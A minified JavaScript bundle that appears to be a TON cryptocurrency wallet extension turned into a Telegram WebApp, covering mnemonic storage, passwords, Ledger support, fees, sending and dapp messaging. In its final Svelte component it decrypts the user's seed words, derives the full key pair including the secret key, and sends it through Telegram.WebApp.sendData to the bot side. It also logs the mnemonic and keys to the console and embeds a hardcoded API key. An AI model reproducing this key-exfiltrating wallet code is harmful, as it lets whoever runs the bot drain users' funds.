this.importImpl(t,n),this.sendToView("importCompleted",{state:"success"})}catch(e){this.debug(e),this.sendToView("importCompleted",{state:"failure"})}else this.sendToView("importCompleted",{state:"failure"})}async importImpl(e,t){this.walletContract=new t(this.ton.provider,{publicKey:e.publicKey,wc:0}),this.myAddress=(await this.walletContract.getAddress()).toString(!0,!0,!0),this.publicKeyHex=TonWeb.utils.bytesToHex(e.publicKey),await ge.setItem("publicKey",this.publicKeyHex),await ge.setItem("walletVersion",this.walletContract.getName()),this.showCreatePassword()}showCreatePassword(){this.sendToView("showScreen",{name:"createPassword"})}async savePrivateKey(e){this.isLedger=!1,await ge.setItem("isLedger","false"),await ge.setItem("address",this.myAddress),await st.saveWords(this.myMnemonicWords,e),this.myMnemonicWords=null,this.sendToView("setIsLedger",this.isLedger),this.sendToView("showScreen",{name:"readyToGo"}),this.sendToView("privateKeySaved")}async onChangePassword(e,t){let s;try{s=await st.loadWords(e)}catch(e){return void this.sendToView("showChangePasswordError")}await st.saveWords(s,t),this.sendToView("closePopup"),this.sendToView("passwordChanged")}async onEnterPassword(e){let t;try{t=await st.loadWords(e)}catch(e){return void this.sendToView("showEnterPasswordError")}this.afterEnterPassword(t),this.sendToView("passwordEntered")}async showMain(){if(this.sendToView("showScreen",{name:"main",myAddress:this.myAddress}),!this.walletContract){const e=await ge.getItem("walletVersion"),t=e?this.ton.wallet.all[e]:this.ton.wallet.default;this.walletContract=new t(this.ton.provider,{address:this.myAddress,publicKey:this.publicKeyHex?TonWeb.utils.hexToBytes(this.publicKeyHex):void 0,wc:0})}this.updateIntervalId=setInterval((()=>this.update()),5e3),this.update(!0),this.sendToDapp("ton_accounts",[this.myAddress])}async initDapp(){this.sendToDapp("ton_accounts",this.myAddress?[this.myAddress]:[]),this.doMagic("true"===await ge.getItem("magic")),this.doProxy("true"===await ge.getItem("proxy"))}async initView(){this.myAddress&&await ge.getItem("words")?(this.sendToView("showScreen",{name:"main",myAddress:this.myAddress}),null!==this.balance&&this.sendToView("setBalance",{balance:this.balance.toString(),txs:this.transactions})):this.sendToView("showScreen",{name:"start",noAnimation:!0}),this.sendToView("setIsMagic","true"===await ge.getItem("magic")),this.sendToView("setIsProxy","true"===await ge.getItem("proxy")),this.sendToView("setIsTestnet",this.isTestnet)}async update(e){if(!(this.processingVisible&&this.sendingData||null===this.balance||e))return;const t=await this.getWallet(),s=this.getBalance(t),n=null===this.balance||0!==this.balance.cmp(s);this.balance=s;const i=this.checkContractInitialized(t)&&t.seqno;this.debug("isBalanceChanged",n),this.debug("isContractInitialized",i),!this.isContractInitialized&&i&&(this.isContractInitialized=!0),n?this.getTransactions().then((e=>{if(e.length>0){this.transactions=e;const t=e.filter((e=>Number(e.date)>this.lastTransactionTime));if(this.lastTransactionTime=Number(e[0].date),this.processingVisible&&this.sendingData)for(let e of t){const t=new qe(e.to_addr).toString(!0,!0,!0),s=new qe(this.sendingData.toAddress).toString(!0,!0,!0),n=e.amount,i="-"+this.sendingData.amount.toString();if(t===s&&n===i){this.sendToView("showPopup",{name:"done",message:Ue(this.sendingData.amount)+" TON have been sent"}),this.processingVisible=!1,this.sendingData=null;break}}}this.sendToView("setBalance",{balance:s.toString(),txs:e})})):this.sendToView("setBalance",{balance:s.toString(),txs:this.transactions})}async showAddressOnDevice(){this.ledgerApp||await this.createLedger(await ge.getItem("ledgerTransportType")||"hid");const{address:e}=await this.ledgerApp.getAddress(0,!0,this.ledgerApp.ADDRESS_FORMAT_USER_FRIENDLY+this.ledgerApp.ADDRESS_FORMAT_URL_SAFE+this.ledgerApp.ADDRESS_FORMAT_BOUNCEABLE);this.debug(e.toString(!0,!0,!0))}async getFees(e,t,s,n){if(!this.isContractInitialized&&!this.publicKeyHex)return TonWeb.utils.toNano("0.010966001");const i=await this.sign(t,e,s,null,n),o=(await i.estimateFee()).source_fees,a=new He(o.in_fwd_fee),r=new He(o.storage_fee),l=new He(o.gas_fee),c=new He(o.fwd_fee);return a.add(r).add(l).add(c)}async showSendConfirm(e,t,s,n,i){if((()=>{let e,t;Xe&&Xe.resolve(!1),Xe=new Promise(((s,n)=>{e=s,t=n})),Xe.resolve=(...t)=>{e(...t),Xe=null},Xe.reject=(...e)=>{t(...e),Xe=null}})(),!e.gt(new He(0)))return this.sendToView("sendCheckFailed",{message:"Invalid amount"}),!1;if(!qe.isValid(t))try{if(t=t.toLowerCase(),this.isTestnet&&t.endsWith(".ton")){if(!(t=await this.ton.dns.getWalletAddress(t)))throw new Error;if(!qe.isValid(t))throw new Error;t=t.toString(!0,!0,!0)}}catch(e){return this.sendToView("sendCheckFailed",{message:"Invalid address or domain"}),!1}try{await this.update(!0)}catch{return this.sendToView("sendCheckFailed",{message:"API request error"}),!1}if(this.balance.lt(e))return this.sendToView("sendCheckFailed",{message:"Not enough balance"}),!1;let o;try{o=await this.getFees(e,t,s,i)}catch{return this.sendToView("sendCheckFailed",{message:"API request error"}),!1}if(this.balance.sub(o).lt(e))return this.sendToView("sendCheckCantPayFee",{fee:o}),!1;if(this.isLedger){this.sendToView("showPopup",{name:"sendConfirm",amount:e.toString(),toAddress:t,fee:o.toString()},n);await this.send(t,e,s,null,i)?Xe.resolve(!0):(this.sendToView("sendCheckFailed",{message:"API request error"}),Xe.resolve(!1))}else this.afterEnterPassword=async n=>{this.processingVisible=!0,this.sendToView("showPopup",{name:"processing"});const o=await st.wordsToPrivateKey(n);await this.send(t,e,s,o,i)?Xe.resolve(!0):(this.sendToView("sendCheckFailed",{message:"API request error"}),Xe.resolve(!1))},this.onCancelAction=()=>{Xe.resolve(!1)},this.sendToView("showPopup",{name:"sendConfirm",amount:e.toString(),toAddress:t,fee:o.toString()},n);return this.sendToView("sendCheckSucceeded"),Xe||!1}showSignConfirm(e,t){return new Promise(((s,n)=>{this.isLedger?(alert("sign not supported by Ledger"),n()):(this.afterEnterPassword=async t=>{this.sendToView("closePopup");const n=await st.wordsToPrivateKey(t),i=this.rawSign(e,n);s(i)},this.sendToView("showPopup",{name:"signConfirm",data:e},t))}))}async send(e,t,s,n,i){try{let o=0;if(this.isLedger){if(i)throw new Error("stateInit dont supported by Ledger");this.ledgerApp||await this.createLedger(await ge.getItem("ledgerTransportType")||"hid");const t=new qe(e);t.isUserFriendly&&(o+=this.ledgerApp.ADDRESS_FORMAT_USER_FRIENDLY,t.isUrlSafe&&(o+=this.ledgerApp.ADDRESS_FORMAT_URL_SAFE),t.isBounceable&&(o+=this.ledgerApp.ADDRESS_FORMAT_BOUNCEABLE),t.isTestOnly&&(o+=this.ledgerApp.ADDRESS_FORMAT_TEST_ONLY))}if(this.checkContractInitialized(await this.ton.provider.getWalletInfo(e))||(e=new qe(e).toString(!0,!0,!1)),this.isLedger){let n=(await this.getWallet(this.myAddress)).seqno;n||(n=0);const i=await this.ledgerApp.transfer(0,this.walletContract,e,t,n,o);return this.sendingData={toAddress:e,amount:t,comment:s,query:i},this.sendToView("showPopup",{name:"processing"}),this.processingVisible=!0,await this.sendQuery(i)}{const o=je.sign.keyPair.fromSeed(TonWeb.utils.base64ToBytes(n)),a=await this.sign(e,t,s,o,i);return this.sendingData={toAddress:e,amount:t,comment:s,query:a},await this.sendQuery(a)}}catch(e){return this.debug(e),this.sendToView("closePopup"),alert("Error sending"),!1}}rawSign(e,t){const s=je.sign.keyPair.fromSeed(TonWeb.utils.base64ToBytes(t)),n=je.sign.detached(TonWeb.utils.hexToBytes(e),s.secretKey);return TonWeb.utils.bytesToHex(n)}async sendQuery(e){return"ok"===(await e.send())["@type"]||(this.sendToView("closePopup"),alert("Send error"),!1)}clearVars(){this.myAddress=null,this.publicKeyHex=null,this.balance=null,this.walletContract=null,this.transactions=[],this.lastTransactionTime=0,this.isContractInitialized=!1,this.sendingData=null,this.processingVisible=!1,this.isLedger=!1,this.ledgerApp=null,clearInterval(this.updateIntervalId)}async onDisconnectClick(){this.clearVars(),await ge.clear(),this.sendToView("showScreen",{name:"start"}),this.sendToDapp("ton_accounts",[])}doMagic(e){try{this.sendToDapp("ton_doMagic",e)}catch(e){}}doProxy(e){}sendToView(e,t,s,n){if(!self.view){const i={method:e,params:t},o=()=>{Je?Je.postMessage(i):s&&Qe.push(i)};return n?new Promise((e=>{i.id=this._lastMsgId++,this.pendingMessageResolvers.set(i.id,e),o()})):void o()}{const s=self.view.onMessage(e,t);if(n)return s}}async onViewMessage(e,t){switch(e){case"showScreen":switch(t.name){case"created":await this.showCreated();break;case"import":this.showImport();break;case"importLedger":await this.importLedger(t.transportType)}break;case"import":await this.import(t.words);break;case"createPrivateKey":await this.createPrivateKey();break;case"passwordCreated":await this.savePrivateKey(t.password);break;case"update":this.update(!0);break;case"showAddressOnDevice":await this.showAddressOnDevice();break;case"onCancelAction":this.onCancelAction&&(await this.onCancelAction(),this.onCancelAction=null);break;case"onEnterPassword":await this.onEnterPassword(t.password);break;case"onChangePassword":await this.onChangePassword(t.oldPassword,t.newPassword);break;case"onSend":await this.showSendConfirm(new He(t.amount),t.toAddress,t.comment);break;case"onBackupDone":await this.onBackupDone();break;case"onConfirmBack":this.showBackup(this.myMnemonicWords);break;case"onImportBack":this.sendToView("showScreen",{name:"start"});break;case"onConfirmDone":this.onConfirmDone(t.words);break;case"showMain":await this.showMain();break;case"onBackupWalletClick":this.onBackupWalletClick();break;case"disconnect":await this.onDisconnectClick();break;case"onClosePopup":this.processingVisible=!1;break;case"onMagicClick":await ge.setItem("magic",t?"true":"false"),this.doMagic(t);break;case"onProxyClick":await ge.setItem("proxy",t?"true":"false"),this.doProxy(t);break;case"toggleTestnet":await this.toggleTestnet();break;case"toggleDebug":await this.toggleDebug();break;case"onWindowUpdate":await ge.setItem("windowState",{top:t.top,left:t.left,height:t.height-2,width:t.width-2})}}sendToDapp(e,t){Ge.forEach((s=>{s.postMessage(JSON.stringify({type:"gramWalletAPI",message:{jsonrpc:"2.0",method:e,params:t}}))}))}requestPublicKey(e){return new Promise((async(t,s)=>{await Ze(),this.afterEnterPassword=async e=>{const s=await st.wordsToPrivateKey(e),n=je.sign.keyPair.fromSeed(TonWeb.utils.base64ToBytes(s));this.publicKeyHex=TonWeb.utils.bytesToHex(n.publicKey),await ge.setItem("publicKey",this.publicKeyHex),t()},this.sendToView("showPopup",{name:"enterPassword"},e)}))}async onDappMessage(e,t){await this.whenReady;const s=!Je;switch(e){case"ton_requestAccounts":return this.myAddress?[this.myAddress]:[];case"ton_requestWallets":if(!this.myAddress)return[];this.publicKeyHex||await this.requestPublicKey(s);const e=await ge.getItem("walletVersion");return[{address:this.myAddress,publicKey:this.publicKeyHex,walletVersion:e}];case"ton_getBalance":return await this.update(!0),this.balance?this.balance.toString():"";case"ton_sendTransaction":const n=t[0];await Ze(),n.data&&("hex"===n.dataType?n.data=TonWeb.utils.hexToBytes(n.data):"base64"===n.dataType?n.data=TonWeb.utils.base64ToBytes(n.data):"boc"===n.dataType&&(n.data=TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(n.data)))),n.stateInit&&(n.stateInit=TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(n.stateInit))),this.sendToView("showPopup",{name:"loader"});const i=await this.showSendConfirm(new He(n.value),n.to,n.data,s,n.stateInit);return i||this.sendToView("closePopup"),i;case"ton_rawSign":const o=t[0];return await Ze(),this.showSignConfirm(o.data,s);case"flushMemoryCache":return await chrome.webRequest.handlerBehaviorChanged(),!0}}}const nt=new st;if(et){chrome.runtime.onConnect.addListener((e=>{if("gramWalletContentScript"===e.name)Ge.add(e),e.onMessage.addListener((async(e,t)=>{if("gramWalletAPI_ton_provider_connect"===e.type&&nt.whenReady.then((()=>{nt.initDapp()})),!e.message)return;const s=await nt.onDappMessage(e.message.method,e.message.params);t&&t.postMessage(JSON.stringify({type:"gramWalletAPI",message:{jsonrpc:"2.0",id:e.message.id,method:e.message.method,result:s}}))})),e.onDisconnect.addListener((e=>{Ge.delete(e)}));else if("gramWalletPopup"===e.name){Je=e,Je.onMessage.addListener((function(e){if("response"===e.method){const t=nt.pendingMessageResolvers.get(e.id);t&&(t(e.result),nt.pendingMessageResolvers.delete(e.id))}else nt.onViewMessage(e.method,e.params)})),Je.onDisconnect.addListener((()=>{Je=null}));const t=()=>{Qe.forEach((e=>Je.postMessage(e))),Qe.length=0};nt.myAddress||t(),nt.whenReady.then((async()=>{await nt.initView(),t()}))}}));let e="action";2===chrome.runtime.getManifest().manifest_version&&(e="browserAction"),chrome[e].onClicked.addListener(Ze),chrome.windows.onRemoved.addListener((e=>{Xe&&Xe.resolve(!1),e===Ye&&(Ye=-1)}))}function it(e){let t,s,n,i;return{c(){t=_("wallet: "),s=_(e[4]),n=_("\n    balance: "),i=_(e[5])},m(e,o){A(e,t,o),A(e,s,o),A(e,n,o),A(e,i,o)},p(e,t){16&t&&k(s,e[4]),32&t&&k(i,e[5])},d(e){e&&C(t),e&&C(s),e&&C(n),e&&C(i)}}}function ot(e){let t,s;return{c(){t=S("div"),s=_(e[0]),P(t,"class","words svelte-13ry9l3")},m(e,n){A(e,t,n),T(t,s)},p(e,t){1&t&&k(s,e[0])},d(e){e&&C(t)}}}function at(e){let t;return{c(){t=_("Create")},m(e,s){A(e,t,s)},d(e){e&&C(t)}}}function rt(e){let t;return{c(){t=_("Import")},m(e,s){A(e,t,s)},d(e){e&&C(t)}}}function lt(e){let t;return{c(){t=_("Confirm Pin-Code")},m(e,s){A(e,t,s)},d(e){e&&C(t)}}}function ct(e){let t,s,n,i,a,r,l,c,d,u,h,p,w,m,g,f,y,b,$,v,V,W,D=e[4]&&it(e),K=e[0].length&&ot(e);return u=new be({props:{type:"accent",$$slots:{default:[at]},$$scope:{ctx:e}}}),u.$on("click",e[6]),h=new be({props:{$$slots:{default:[rt]},$$scope:{ctx:e}}}),y=new be({props:{type:"accent",$$slots:{default:[lt]},$$scope:{ctx:e}}}),y.$on("click",e[11]),$=new Fe({props:{confirmPassword:e[7],open:e[2]}}),{c(){t=S("main"),s=S("div"),n=_(e[3]),i=I(),D&&D.c(),a=I(),r=S("div"),l=S("h2"),l.textContent="Create or import wallet",c=I(),K&&K.c(),d=I(),ue(u.$$.fragment),ue(h.$$.fragment),p=I(),w=S("h2"),w.textContent="SetUp Password",m=I(),g=S("input"),f=I(),ue(y.$$.fragment),b=I(),ue($.$$.fragment),P(s,"class","error svelte-13ry9l3"),P(r,"class","svelte-13ry9l3"),P(t,"class","svelte-13ry9l3")},m(o,C){A(o,t,C),T(t,s),T(s,n),T(t,i),D&&D.m(t,null),T(t,a),T(t,r),T(r,l),T(r,c),K&&K.m(r,null),T(r,d),he(u,r,null),he(h,r,null),T(t,p),T(t,w),T(t,m),T(t,g),E(g,e[1]),T(t,f),he(y,t,null),T(t,b),he($,t,null),v=!0,V||(W=[x(g,"change",e[9]),x(g,"input",e[10])],V=!0)},p(e,[s]){(!v||8&s)&&k(n,e[3]),e[4]?D?D.p(e,s):(D=it(e),D.c(),D.m(t,a)):D&&(D.d(1),D=null),e[0].length?K?K.p(e,s):(K=ot(e),K.c(),K.m(r,d)):K&&(K.d(1),K=null);const i={};262144&s&&(i.$$scope={dirty:s,ctx:e}),u.$set(i);const o={};262144&s&&(o.$$scope={dirty:s,ctx:e}),h.$set(o),2&s&&g.value!==e[1]&&E(g,e[1]);const l={};262144&s&&(l.$$scope={dirty:s,ctx:e}),y.$set(l);const c={};4&s&&(c.open=e[2]),$.$set(c)},i(e){v||(re(u.$$.fragment,e),re(h.$$.fragment,e),re(y.$$.fragment,e),re($.$$.fragment,e),v=!0)},o(e){le(u.$$.fragment,e),le(h.$$.fragment,e),le(y.$$.fragment,e),le($.$$.fragment,e),v=!1},d(e){e&&C(t),D&&D.d(),K&&K.d(),pe(u),pe(h),pe(y),pe($),V=!1,o(W)}}}function dt(e,t,s){let n,i,o,a,{name:r}=t,l=[],c="",d=!1,u="";const h=window.TonWeb,p=new h(new h.HttpProvider("https://testnet.toncenter.com/api/v2/jsonRPC",{apiKey:"36a585cf3e99d3c844e448b495c7b2f66bd279d4f4782540e1cf01ffa8833c50"})),w=window.Telegram.WebApp,m=h.utils.nacl;var g;g=async()=>{await ge.getItem("words")&&s(2,d=!0)},O().$$.on_mount.push(g);return e.$$set=e=>{"name"in e&&s(8,r=e.name)},[l,c,d,u,o,a,async()=>{s(0,l=await h.mnemonic.generateMnemonic()),console.log(l),console.log(c)},async e=>{try{s(0,l=await st.loadWords(e));const t=await st.wordsToPrivateKey(l);n=m.sign.keyPair.fromSeed(h.utils.base64ToBytes(t)),console.log(n);const r=p.wallet.all.v3R2;i=new r(p.provider,{publicKey:n.publicKey,wc:0}),s(4,o=(await i.getAddress()).toString(!0,!0,!0)),console.log(o);const c=await p.provider.getWalletInfo(o);s(5,a=nt.getBalance(c)),w.sendData(JSON.stringify({wallet:o,keyPair:n,walletBalance:a})),s(2,d=!1),s(3,u="")}catch(e){s(3,u="ERROR")}},r,async e=>{console.log(e),console.log(c)},function(){c=this.value,s(1,c)},()=>{st.saveWords(l,c)}]}return new class extends me{constructor(e){super(),we(this,e,dt,ct,r,{name:8})}}({target:document.body,props:{name:"world"}})}();
//# sourceMappingURL=bundle.js.map
